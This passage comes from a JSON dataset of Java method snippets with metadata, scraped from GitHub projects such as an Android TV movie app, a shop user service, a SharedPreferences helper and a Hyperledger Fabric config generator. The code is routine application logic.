["public"]}}, {"id": 31441, "method_name": "onFocusChange", "class_name": "MoreViewHolder", "params": ["View", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFocusChange(View v, boolean hasFocus) {\n        if (hasFocus) {\n            textview.setVisibility(View.VISIBLE);\n        } else {\n            textview.setVisibility(View.GONE);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/presenters/MoreViewHolder.java", "stars": "4", "class_props": {"extends": "Presenter", "implements": ["View"], "modifiers": ["public"]}}, {"id": 31442, "method_name": "generateData", "class_name": "QuickDataGenerator", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void generateData() {\n        super.generate(NUMBER_OF_GARDEN_FIELDS_TO_GENERATE, NUMBER_OF_USERS_TO_GENERATE, NUMBER_OF_OPEN_LEASINGS_TO_GENERATE,\n            NUMBER_OF_RESERVED_LEASINGS_TO_GENERATE, NUMBER_OF_MESSAGES_THREADS, NUMBER_OF_MESSAGES,\n            MIN_NUMBER_OF_IMAGES_PER_GARDENFIELD, MAX_NUMBER_OF_IMAGES_PER_GARDENFIELD, BATCH_SIZE);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/datagenerator/QuickDataGenerator.java", "stars": "2", "class_props": {"extends": "DataGenerator", "implements": null, "modifiers": ["public"]}}, {"id": 31443, "method_name": "create", "class_name": "FaceEngineFactory", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "FaceEngine", "snippet": "    public FaceEngine create() throws Exception {\n\n        EngineConfiguration engineConfiguration = EngineConfiguration.builder()\n                .functionConfiguration(functionConfiguration)\n                .detectFaceMaxNum(detectFaceMaxNum)\n                .detectFaceScaleVal(detectFaceScaleVal)\n                .detectMode(detectMode)\n                .detectFaceOrientPriority(detectFaceOrientPriority)\n                .build();\n        FaceEngine faceEngine = new FaceEngine(libPath);\n        faceEngine.active(appId, sdkKey);\n        faceEngine.init(engineConfiguration);\n\n        return faceEngine;\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/factory/FaceEngineFactory.java", "stars": "2", "class_props": {"extends": "BasePooledObjectFactory", "implements": null, "modifiers": ["public"]}}, {"id": 31444, "method_name": "wrap", "class_name": "FaceEngineFactory", "params": ["FaceEngine"], "throws": null, "modifiers": ["public"], "return_type": "PooledObject<FaceEngine>", "snippet": "    public PooledObject<FaceEngine> wrap(FaceEngine faceEngine) {\n        return new DefaultPooledObject<>(faceEngine);\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/factory/FaceEngineFactory.java", "stars": "2", "class_props": {"extends": "BasePooledObjectFactory", "implements": null, "modifiers": ["public"]}}, {"id": 31445, "method_name": "destroyObject", "class_name": "FaceEngineFactory", "params": ["PooledObject<FaceEngine>"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void destroyObject(PooledObject<FaceEngine> p) throws Exception {\n        FaceEngine faceEngine = p.getObject();\n        int result = faceEngine.unInit();\n        super.destroyObject(p);\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/factory/FaceEngineFactory.java", "stars": "2", "class_props": {"extends": "BasePooledObjectFactory", "implements": null, "modifiers": ["public"]}}, {"id": 31446, "method_name": "getUserById", "class_name": "UserServiceImpl", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "UserModel", "snippet": "    public UserModel getUserById(Integer id) {\n        UserDO userDO = userDOMapper.selectByPrimaryKey(id);\n        if (userDO == null) return null;\n        UserPasswordDO userPasswordDO = userPasswordDOMapper.selectByUserId(userDO.getId());\n        return convertFromDataObject(userDO, userPasswordDO);\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/impl/UserServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31447, "method_name": "convertFromDataObject", "class_name": "UserServiceImpl", "params": ["UserDO", "UserPasswordDO"], "throws": null, "modifiers": ["private"], "return_type": "UserModel", "snippet": "    private UserModel convertFromDataObject(UserDO userDO, UserPasswordDO userPasswordDO) {\n        if (userDO == null) return null;\n        UserModel userModel = new UserModel();\n        BeanUtils.copyProperties(userDO, userModel);\n        if (userPasswordDO != null) {\n            userModel.setEncrptPassword(userPasswordDO.getEncrptPassword());\n        }\n        return userModel;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/impl/UserServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31448, "method_name": "registerUser", "class_name": "UserServiceImpl", "params": ["UserModel"], "throws": ["BusinessException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void registerUser(UserModel userModel) throws BusinessException {\n        if (userModel == null) throw new BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR);\n        ValidationResult validationResult = validatorImpl.validate(userModel);\n        if (validationResult.isHasErrors()) throw new BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR, validationResult.getErrMsg());\n        try {\n            UserDO userDO = convertFromModel(userModel);\n            userDOMapper.insertSelective(userDO);\n            userModel.setId(userDO.getId());\n            UserPasswordDO userPasswordDO = convertPasswordFromModel(userModel);\n            userPasswordDOMapper.insertSelective(userPasswordDO);\n        } catch (Exception e) {\n            throw new BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR, \"\u624b\u673a\u53f7\u5df2\u6ce8\u518c\");\n        }\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/impl/UserServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31449, "method_name": "convertFromModel", "class_name": "UserServiceImpl", "params": ["UserModel"], "throws": null, "modifiers": ["private"], "return_type": "UserDO", "snippet": "    private UserDO convertFromModel(UserModel userModel) {\n        if (userModel == null) return null;\n        UserDO userDO = new UserDO();\n        BeanUtils.copyProperties(userModel, userDO);\n        return userDO;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/impl/UserServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31450, "method_name": "convertPasswordFromModel", "class_name": "UserServiceImpl", "params": ["UserModel"], "throws": null, "modifiers": ["private"], "return_type": "UserPasswordDO", "snippet": "    private UserPasswordDO convertPasswordFromModel(UserModel userModel) {\n        if (userModel == null) return null;\n        UserPasswordDO userPasswordDO = new UserPasswordDO();\n        userPasswordDO.setEncrptPassword(userModel.getEncrptPassword());\n        userPasswordDO.setUserId(userModel.getId());\n        return userPasswordDO;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/impl/UserServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31451, "method_name": "validateLogin", "class_name": "UserServiceImpl", "params": ["String", "String"], "throws": ["BusinessException"], "modifiers": ["public"], "return_type": "UserModel", "snippet": "    public UserModel validateLogin(String telphone, String encrptPassword) throws BusinessException {\n        if (StringUtils.isEmpty(telphone) || StringUtils.isEmpty(encrptPassword)) throw new BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR);\n        UserDO userDO = userDOMapper.selectByTelphone(telphone);\n        if (userDO == null) throw new BusinessException(EmBusinessError.USER_LOGIN_FAIL);\n        UserPasswordDO userPasswordDO = userPasswordDOMapper.selectByUserId(userDO.getId());\n        if (! userPasswordDO.getEncrptPassword().equals(encrptPassword)) throw new BusinessException(EmBusinessError.USER_LOGIN_FAIL);\n        return convertFromDataObject(userDO, userPasswordDO);\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/impl/UserServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["UserService"], "modifiers": ["public"]}}, {"id": 31452, "method_name": "elasticsearchProperties", "class_name": "ElasticsearchTestConfiguration", "params": ["ElasticsearchProperties"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void elasticsearchProperties(ElasticsearchProperties elasticsearchProperties) {\n        File tempdir = Files.newTemporaryFolder();\n        elasticsearchProperties.getProperties().put(\"path.home\", tempdir.getAbsolutePath());\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/config/ElasticsearchTestConfiguration.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31453, "method_name": "getInstance", "class_name": "SpUtil", "params": ["Context"], "throws": null, "modifiers": ["private", "static"], "return_type": "SharedPreferences", "snippet": "    private static SharedPreferences getInstance(Context context) {\n        if (sp == null) {\n            sp = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);\n        }\n        return sp;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31454, "method_name": "putString", "class_name": "SpUtil", "params": ["Context", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putString(Context context, String key, String value) {\n        SharedPreferences preferences = getInstance(context);\n        //\u5b58\u5165\u6570\u636e\n        Editor editor = preferences.edit();\n        editor.putString(key, value);\n        editor.commit();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31455, "method_name": "getString", "class_name": "SpUtil", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getString(Context context, String key) {\n        SharedPreferences preferences = getInstance(context);\n        return preferences.getString(key, \"\");\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31456, "method_name": "getString", "class_name": "SpUtil", "params": ["Context", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getString(Context context, String key, String value) {\n        SharedPreferences preferences = getInstance(context);\n        return preferences.getString(key, value);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31457, "method_name": "putBoolean", "class_name": "SpUtil", "params": ["Context", "String", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putBoolean(Context context, String key, boolean value) {\n        SharedPreferences sp = getInstance(context);\n        Editor editor = sp.edit();\n        editor.putBoolean(key, value);\n        editor.commit();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31458, "method_name": "getBoolean", "class_name": "SpUtil", "params": ["Context", "String", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean getBoolean(Context context, String key, boolean defValue) {\n        SharedPreferences sp = getInstance(context);\n        return sp.getBoolean(key, defValue);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31459, "method_name": "putLong", "class_name": "SpUtil", "params": ["Context", "String", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putLong(Context context, String key, long value) {\n        SharedPreferences sp = getInstance(context);\n        Editor editor = sp.edit();\n        editor.putLong(key, value);\n        editor.commit();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31460, "method_name": "getLong", "class_name": "SpUtil", "params": ["Context", "String", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long getLong(Context context, String key, long defValue) {\n        SharedPreferences sp = getInstance(context);\n        return sp.getLong(key, defValue);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31461, "method_name": "putInt", "class_name": "SpUtil", "params": ["Context", "String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putInt(Context context, String key, int value) {\n        SharedPreferences sp = getInstance(context);\n        Editor editor = sp.edit();\n        editor.putInt(key, value);\n        editor.commit();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31462, "method_name": "getInt", "class_name": "SpUtil", "params": ["Context", "String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int getInt(Context context, String key, int defValue) {\n        SharedPreferences sp = getInstance(context);\n        return sp.getInt(key, defValue);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31463, "method_name": "putObject", "class_name": "SpUtil", "params": ["Context", "String", "T"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static <T extends Serializable> void putObject(Context context, String key, T obj) {\n        try {\n            put(context, key, obj);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31464, "method_name": "getObject", "class_name": "SpUtil", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T extends Serializable> T getObject(Context context, String key) {\n        try {\n            return (T) get(context, key);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31465, "method_name": "putList", "class_name": "SpUtil", "params": ["Context", "String", "List<Serializable>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void putList(Context context, String key, List<? extends Serializable> list) {\n        try {\n            put(context, key, list);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31466, "method_name": "getList", "class_name": "SpUtil", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<E>", "snippet": "    public static <E extends Serializable> List<E> getList(Context context, String key) {\n        try {\n            return (List<E>) get(context, key);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31467, "method_name": "putMap", "class_name": "SpUtil", "params": ["Context", "String", "Map<K,V>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static <K extends Serializable, V extends Serializable> void putMap(Context context,\n                                                                               String key, Map<K, V> map) {\n        try {\n            put(context, key, map);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31468, "method_name": "getMap", "class_name": "SpUtil", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Map<K,V>", "snippet": "    public static <K extends Serializable, V extends Serializable> Map<K, V> getMap(Context context,\n                                                                                    String key) {\n        try {\n            return (Map<K, V>) get(context, key);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31469, "method_name": "put", "class_name": "SpUtil", "params": ["Context", "String", "Object"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void put(Context context, String key, Object obj)\n            throws IOException {\n        if (obj == null) {//\u5224\u65ad\u5bf9\u8c61\u662f\u5426\u4e3a\u7a7a\n            return;\n        }\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = null;\n        oos = new ObjectOutputStream(baos);\n        oos.writeObject(obj);\n        // \u5c06\u5bf9\u8c61\u653e\u5230OutputStream\u4e2d\n        // \u5c06\u5bf9\u8c61\u8f6c\u6362\u6210byte\u6570\u7ec4\uff0c\u5e76\u5c06\u5176\u8fdb\u884cbase64\u7f16\u7801\n        String objectStr = new String(Base64.encode(baos.toByteArray(), Base64.DEFAULT));\n        baos.close();\n        oos.close();\n\n        putString(context, key, objectStr);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31470, "method_name": "get", "class_name": "SpUtil", "params": ["Context", "String"], "throws": ["IOException", "ClassNotFoundException"], "modifiers": ["private", "static"], "return_type": "Object", "snippet": "    private static Object get(Context context, String key)\n            throws IOException, ClassNotFoundException {\n        String wordBase64 = getString(context, key);\n        // \u5c06base64\u683c\u5f0f\u5b57\u7b26\u4e32\u8fd8\u539f\u6210byte\u6570\u7ec4\n        if (TextUtils.isEmpty(wordBase64)) { //\u4e0d\u53ef\u5c11\uff0c\u5426\u5219\u5728\u4e0b\u9762\u4f1a\u62a5java.io.StreamCorruptedException\n            return null;\n        }\n        byte[] objBytes = Base64.decode(wordBase64.getBytes(), Base64.DEFAULT);\n        ByteArrayInputStream bais = new ByteArrayInputStream(objBytes);\n        ObjectInputStream ois = new ObjectInputStream(bais);\n        // \u5c06byte\u6570\u7ec4\u8f6c\u6362\u6210product\u5bf9\u8c61\n        Object obj = ois.readObject();\n        bais.close();\n        ois.close();\n        return obj;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SpUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31471, "method_name": "createConfigFile", "class_name": "ConfigFileGen", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void createConfigFile(InitConfigEntity config) {\n\n        // \u751f\u6210 configtx.yaml \u6587\u4ef6,\u5176\u5b83\u673a\u6784\u5728profile\u4e2d\u53ea\u6709PrivateChannel\u914d\u7f6e\uff0c\u9700\u5728\u5b50\u7c7b\u5177\u4f53\u5b9e\u73b0\n        if (fabricConfigGen.configTxGen(config)) {\n            // log.info(\"\u751f\u6210 configtx.yaml \u6587\u4ef6\u6210\u529f\");\n            log.info(\"the configtx.yaml file was generated successfully\");\n        } else {\n            // log.error(\"\u751f\u6210 configtx.yaml \u6587\u4ef6\u5931\u8d25\");\n            log.error(\"Failed to generate configtx.yaml file\");\n        }\n\n        // \u751f\u6210 crypto-config.yaml \u6587\u4ef6\n        if (fabricConfigGen.cryptoGen(config)) {\n            // log.info(\"\u751f\u6210 crypto-config.yaml \u6587\u4ef6\u6210\u529f\");\n            log.info(\"the crypto-config.yaml file was generated successfully\");\n        } else {\n            // log.error(\"\u751f\u6210 crypto-config.yaml \u6587\u4ef6\u5931\u8d25\");\n            log.error(\"Failed to generate crypto-config.yaml file\");\n        }\n\n        // \u521b\u5efa crypto-config \u76ee\u5f55\u548c\u8bc1\u4e66\n        if (createNewCerts()) {\n            // log.info(\"\u521b\u5efa\u8bc1\u4e66\u6210\u529f\");\n            log.info(\"Successfully created certificate\");\n        } else {\n            // log.error(\"\u521b\u5efa\u8bc1\u4e66\u5931\u8d25\");\n            log.error(\"Failed to create certificate\");\n        }\n\n        // \u751f\u6210 orderer docker compose yaml \u6587\u4ef6\n        if (dockerConfigGen.ordererComposeFileGen(config)) {\n            // log.info(\"\u751f\u6210 docker-compose-orderer.yaml \u6587\u4ef6\u6210\u529f\");\n            log.info(\"the docker-compose-orderer.yaml file was generated successfully\");\n        } else {\n            // log.error(\"\u751f\u6210 docker-compose-orderer.yaml \u6587\u4ef6\u5931\u8d25\");\n            log.error(\"Failed to generate docker-compose-orderer.yaml file\");\n        }\n\n        // \u751f\u6210 peer docker compose yaml \u6587\u4ef6,\u672c\u914d\u7f6e\u6587\u4ef6\u4e0d\u533a\u5206\u53d1\u8d77\u673a\u6784\u4e0e\u5176\u4ed6\u673a\u6784\uff0c\u53ef\u5177\u4f53\u5b9e\u73b0\n        if (dockerConfigGen.peerComposeFileGen(config)) {\n            // log.info(\"\u751f\u6210 docker-compose-peer.yaml \u6587\u4ef6\u6210\u529f\");\n            log.info(\"the docker-compose-peer.yaml file was generated successfully\");\n        } else {\n            // log.error(\"\u751f\u6210 docker-compose-peer.yaml \u6587\u4ef6\u5931\u8d25\");\n            log.error(\"Failed to generate docker-compose-peer.yaml file\");\n        }\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/ConfigFileGen.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31472, "method_name": "createNewCerts", "class_name": "ConfigFileGen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean createNewCerts() {\n        return createCerts(\"up\");\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/ConfigFileGen.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31473, "method_name": "createExtendCerts", "class_name": "ConfigFileGen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean createExtendCerts() {\n        return createCerts(\"extend\");\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/ConfigFileGen.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31474, "method_name": "createCerts", "class_name": "ConfigFileGen", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean createCerts(String mode) {\n        String workingDir = modeService.getInitDir() + \"fabric-net/cryptoAndConfig\";\n        String shellFilePath = modeService.getInitDir() + \"generate.sh\";\n        try {\n            ProcessUtil.Result result = ProcessUtil.execCmd(\"bash \" + shellFilePath + \" \" + mode, new String[]{\"CRYPTTOGEN_FILE_PATH\" + \"=\" + CacheUtil.getCryptogenFilePath()}, workingDir);\n            if (result.getCode() == 0) {\n                return true;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/config/ConfigFileGen.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31475, "method_name": "onFinish", "class_name": "EventListenersListener", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onFinish();\n    public void Add(AbstractEventListener abstractEventListener)  {\n        if(Locked)\n            throw new RuntimeException(\"Event Listeners Listener Locked\");\n        retrievalEventListeners.add(abstractEventListener);\n    }", "url": "https://raw.githubusercontent.com/islammohsen/FirebaseDao/master/firbasedao/src/main/java/com/example/firbasedao/Listeners/EventListenersListener.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31476, "method_name": "Add", "class_name": "EventListenersListener", "params": ["AbstractEventListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Add(AbstractEventListener abstractEventListener)  {\n        if(Locked)\n            throw new RuntimeException(\"Event Listeners Listener Locked\");\n        retrievalEventListeners.add(abstractEventListener);\n    }", "url": "https://raw.githubusercontent.com/islammohsen/FirebaseDao/master/firbasedao/src/main/java/com/example/firbasedao/Listeners/EventListenersListener.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31477, "method_name": "OnFinishAddingListeners", "class_name": "EventListenersListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void OnFinishAddingListeners()\n    {\n        Locked = true;\n        if(retrievalEventListeners.size() == 0)\n            onFinish();\n    }", "url": "https://raw.githubusercontent.com/islammohsen/FirebaseDao/master/firbasedao/src/main/java/com/example/firbasedao/Listeners/EventListenersListener.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31478, "method_name": "notify", "class_name": "EventListenersListener", "params": ["AbstractEventListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notify(AbstractEventListener abstractEventListener)  {\n        if(Locked == false)\n            throw new RuntimeException(\"Event Listeners Listener not Locked\");\n        retrievalEventListeners.remove(abstractEventListener);\n        if(retrievalEventListeners.size() == 0)\n            onFinish();\n    }", "url": "https://raw.githubusercontent.com/islammohsen/FirebaseDao/master/firbasedao/src/main/java/com/example/firbasedao/Listeners/EventListenersListener.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31479, "method_name": "onCreate", "class_name": "TVLaunchActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\n\t\tIntent recommendationIntent = new Intent(this, RecommendationService.class);\n\t\tstartService(recommendationIntent);\n\n\t\tif (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {\n\t\t\tActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO, Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSIONS_REQUEST);\n\t\t\treturn;\n\t\t}\n\n\t\tproceedCreate();\n\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVLaunchActivity.java", "stars": "4", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 31480, "method_name": "proceedCreate", "class_name": "TVLaunchActivity", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void proceedCreate() {\n\t\tBoolean firstRun = PrefUtils.get(this, Prefs.FIRST_RUN, true);\n\n\t\tif (firstRun) {\n\t\t\t//run the welcome wizard\n\t\t\tTVWelcomeActivity.startActivity(this);\n\t\t} else {\n\t\t\tString action = getIntent().getAction();\n\t\t\tUri data = getIntent().getData();\n\t\t\tif (action != null && action.equals(Intent.ACTION_VIEW) && data != null) {\n\t\t\t\tString streamUrl = data.toString();\n\t\t\t\ttry {\n\t\t\t\t\tstreamUrl = URLDecoder.decode(streamUrl, \"utf-8\");\n\t\t\t\t\tTVStreamLoadingActivity.startActivity(this, new StreamInfo(streamUrl));\n\t\t\t\t\tfinish();\n\t\t\t\t\treturn;\n\t\t\t\t} catch (UnsupportedEncodingException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t}\n\t\t\tTVMainActivity.startActivity(this);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVLaunchActivity.java", "stars": "4", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 31481, "method_name": "onRequestPermissionsResult", "class_name": "TVLaunchActivity", "params": ["int", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {\n\t\tswitch (requestCode) {\n\t\t\tcase PERMISSIONS_REQUEST: {\n\t\t\t\tif (grantResults.length == 2 && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {\n\t\t\t\t\tproceedCreate();\n\t\t\t\t} else {\n\t\t\t\t\tfinish();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVLaunchActivity.java", "stars": "4", "class_props": {"extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"id": 31482, "method_name": "printStackTrace", "class_name": "AuthenticationFailedException", "params": [], "throws": null, 